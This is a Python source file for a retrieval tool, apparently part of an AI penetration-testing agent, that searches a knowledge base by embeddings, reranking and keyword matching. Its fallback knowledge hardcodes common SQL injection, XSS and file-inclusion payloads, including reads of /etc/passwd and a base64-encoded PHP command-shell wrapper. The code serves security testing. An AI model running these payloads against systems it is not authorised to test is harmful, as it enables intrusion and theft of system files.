"""
知识库RAG系统 - 完整版（Embedding + Rerank）
"""
import os
import json
import pickle
from typing import Dict, Any, List, Optional
from pathlib import Path
from openai import OpenAI
import requests
from .base import BaseTool
from app.core.config import settings


class KnowledgeBase(BaseTool):
    """知识库查询工具 - 完整RAG实现"""
    
    def __init__(self):
        super().__init__(
            name="query_knowledge",
            description="Query penetration testing knowledge base for vulnerabilities, payloads, and techniques using RAG (Embedding + Rerank)"
        )
        
        # 知识库路径
        self.knowledge_dir = Path(settings.KNOWLEDGE_BASE_PATH)
        self.cache_dir = Path(settings.KNOWLEDGE_CACHE_DIR)
        self.cache_dir.mkdir(parents=True, exist_ok=True)
        
        # 向量缓存文件
        self.embedding_cache_file = self.cache_dir / "embeddings.pkl"
        
        # 初始化状态
        self.documents = []
        self.embeddings = []
        self.embedding_loaded = False
        
        # 加载知识库
        self._load_documents()
        
        # 加载或构建嵌入向量
        if settings.RAG_ENABLED:
            self._load_or_build_embeddings()
    
    def _load_documents(self):
        """加载知识库文档"""
        if not self.knowledge_dir.exists():
            # 如果知识库不存在，使用基础知识
            self.documents = self._get_basic_knowledge()
            return
        
        # 扫描所有markdown文件
        for md_file in self.knowledge_dir.rglob("*.md"):
            if md_file.name == "00-INDEX.md":
                continue
            
            try:
                content = md_file.read_text(encoding='utf-8')
                self.documents.append({
                    'file': str(md_file.name),
                    'path': str(md_file),
                    'content': content,
                    'category': md_file.stem.split('-')[0] if '-' in md_file.stem else 'general'
                })
            except Exception as e:
                print(f"Warning: Failed to load {md_file}: {e}")
        
        # 如果没有文件，使用基础知识
        if not self.documents:
            self.documents = self._get_basic_knowledge()
    
    def _get_basic_knowledge(self) -> List[Dict]:
        """基础知识（备用）"""
        return [
            {
                'file': 'sql_injection.md',
                'category': 'sql_injection',
                'content': '''# SQL注入攻击向量

## 基础Payload
- \' OR \'1\'=\'1
- \' UNION SELECT NULL--
- admin\'--
- \' OR 1=1--

## 绕过WAF
- /*!50000UNION*/ /*!50000SELECT*/
- UNI/**/ON SE/**/LECT
'''
            },
            {
                'file': 'xss.md',
                'category': 'xss',
                'content': '''# XSS攻击向量

## 基础Payload
- <script>alert(1)</script>
- <img src=x onerror=alert(1)>
- javascript:alert(1)

## 绕过过滤
- <svg onload=alert(1)>
- <iframe src="javascript:alert(1)">
'''
            },
            {
                'file': 'lfi.md',
                'category': 'lfi',
                'content': '''# 本地文件包含

## 基础Payload
- ../../../etc/passwd
- ....//....//....//etc/passwd
- php://filter/convert.base64-encode/resource=index.php

## Wrapper
- php://input
- data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
'''
            }
        ]
    
    def _load_or_build_embeddings(self):
        """加载或构建嵌入向量"""
        # 检查是否有API Key
        if not settings.EMBEDDING_API_KEY:
            print("Warning: No EMBEDDING_API_KEY, RAG disabled")
            return
        
        # 尝试加载缓存
        if self.embedding_cache_file.exists():
            try:
                with open(self.embedding_cache_file, 'rb') as f:
                    cache_data = pickle.load(f)
                    self.embeddings = cache_data.get('embeddings', [])
                    cached_docs = cache_data.get('documents', [])
                    
                    # 验证缓存是否匹配
                    if len(cached_docs) == len(self.documents):
                        self.embedding_loaded = True
                        print(f"Loaded {len(self.embeddings)} embeddings from cache")
                        return
            except Exception as e:
                print(f"Warning: Failed to load embedding cache: {e}")
        
        # 构建新的嵌入向量
        self._build_embeddings()
    
    def _build_embeddings(self):
        """构建嵌入向量"""
        try:
            client = OpenAI(
                api_key=settings.EMBEDDING_API_KEY,
                base_url=settings.EMBEDDING_BASE_URL
            )
            
            texts = [doc['content'] for doc in self.documents]
            
            # 批量获取embeddings
            response = client.embeddings.create(
                model=settings.EMBEDDING_MODEL,
                input=texts
            )
            
            self.embeddings = [item.embedding for item in response.data]
            
            # 保存缓存
            with open(self.embedding_cache_file, 'wb') as f:
                pickle.dump({
                    'embeddings': self.embeddings,
                    'documents': self.documents
                }, f)
            
            self.embedding_loaded = True
            print(f"Built and cached {len(self.embeddings)} embeddings")
            
        except Exception as e:
            print(f"Warning: Failed to build embeddings: {e}")
    
    def _cosine_similarity(self, vec1: List[float], vec2: List[float]) -> float:
        """计算余弦相似度"""
        import math
        dot_product = sum(a * b for a, b in zip(vec1, vec2))
        magnitude1 = math.sqrt(sum(a * a for a in vec1))
        magnitude2 = math.sqrt(sum(b * b for b in vec2))
        if magnitude1 == 0 or magnitude2 == 0:
            return 0
        return dot_product / (magnitude1 * magnitude2)
    
    def _rerank(self, query: str, candidates: List[Dict]) -> List[Dict]:
        """使用Rerank模型重排序"""
        if not settings.RAG_RERANK_ENABLED or not settings.RERANK_API_KEY:
            return candidates
        
        try:
            # 调用阿里云Rerank API
            response = requests.post(
                settings.RERANK_BASE_URL,
                headers={
                    'Authorization': f'Bearer {settings.RERANK_API_KEY}',
                    'Content-Type': 'application/json'
                },
                json={
                    'model': settings.RERANK_MODEL,
                    'query': query,
                    'documents': [c['content'] for c in candidates],
                    'top_n': settings.RAG_TOP_K,
                    'return_documents': True
                },
                timeout=10
            )
            
            if response.status_code == 200:
                result = response.json()
                reranked = []
                for item in result.get('results', []):
                    idx = item['index']
                    if idx < len(candidates):
                        doc = candidates[idx].copy()
                        doc['rerank_score'] = item['relevance_score']
                        reranked.append(doc)
                return reranked
        except Exception as e:
            print(f"Warning: Rerank failed: {e}")
        
        return candidates
    
    async def execute(self, query: str, category: Optional[str] = None, top_k: Optional[int] = None) -> str:
        """查询知识库"""
        if top_k is None:
            top_k = settings.RAG_TOP_K
        
        # 如果启用RAG且有embeddings
        if settings.RAG_ENABLED and self.embedding_loaded and self.embeddings:
            return await self._rag_search(query, category, top_k)
        else:
            # 回退到关键词匹配
            return await self._keyword_search(query, category, top_k)
    
    async def _rag_search(self, query: str, category: Optional[str], top_k: int) -> str:
        """使用RAG搜索"""
        try:
            # 获取query的embedding
            client = OpenAI(
                api_key=settings.EMBEDDING_API_KEY,
                base_url=settings.EMBEDDING_BASE_URL
            )
            
            response = client.embeddings.create(
                model=settings.EMBEDDING_MODEL,
                input=[query]
            )
            query_embedding = response.data[0].embedding
            
            # 计算相似度
            candidates = []
            for i, doc in enumerate(self.documents):
                # 如果指定了类别，过滤
                if category and doc.get('category') != category:
                    continue
                
                if i < len(self.embeddings):
                    score = self._cosine_similarity(query_embedding, self.embeddings[i])
                    if score >= settings.RAG_SCORE_THRESHOLD:
                        candidates.append({
                            **doc,
                            'score': score
                        })
            
            # 按相似度排序
            candidates.sort(key=lambda x: x['score'], reverse=True)
            candidates = candidates[:top_k * 2]  # 取两倍用于Rerank
            
            # Rerank
            if settings.RAG_RERANK_ENABLED:
                candidates = self._rerank(query, candidates)
            
            # 取Top-K
            results = candidates[:top_k]
            
            if results:
                output = f"Found {len(results)} relevant knowledge entries:\n\n"
                for i, doc in enumerate(results, 1):
                    score = doc.get('rerank_score', doc.get('score', 0))
                    output += f"### Result {i} (Score: {score:.3f})\n"
                    output += f"**Source**: {doc['file']}\n"
                    output += f"**Content**:\n{doc['content'][:500]}...\n\n"
                return output
            else:
                return "No relevant knowledge found"
                
        except Exception as e:
            print(f"RAG search failed: {e}, fallback to keyword search")
            return await self._keyword_search(query, category, top_k)
    
    async def _keyword_search(self, query: str, category: Optional[str], top_k: int) -> str:
        """关键词匹配搜索（回退方案）"""
        results = []
        query_lower = query.lower()
        
        for doc in self.documents:
            if category and doc.get('category') != category:
                continue
            
            content_lower = doc['content'].lower()
            if query_lower in content_lower:
                # 简单计分：出现次数
                score = content_lower.count(query_lower)
                results.append({
                    **doc,
                    'score': score
                })
        
        # 排序
        results.sort(key=lambda x: x['score'], reverse=True)
        results = results[:top_k]
        
        if results:
            output = f"Found {len(results)} results:\n\n"
            for i, doc in enumerate(results, 1):
                output += f"### Result {i}\n"
                output += f"**Source**: {doc['file']}\n"
                output += f"**Content**:\n{doc['content'][:500]}...\n\n"
            return output
        else:
            return "No results found"
    
    def get_parameters(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "query": {
                    "type": "string",
                    "description": "Search query"
                },
                "category": {
                    "type": "string",
                    "description": "Knowledge category (sql_injection, xss, lfi, etc.)",
                    "enum": ["sql_injection", "xss", "lfi", "rce", "ssti"]
                }
            },
            "required": ["query"]
        }
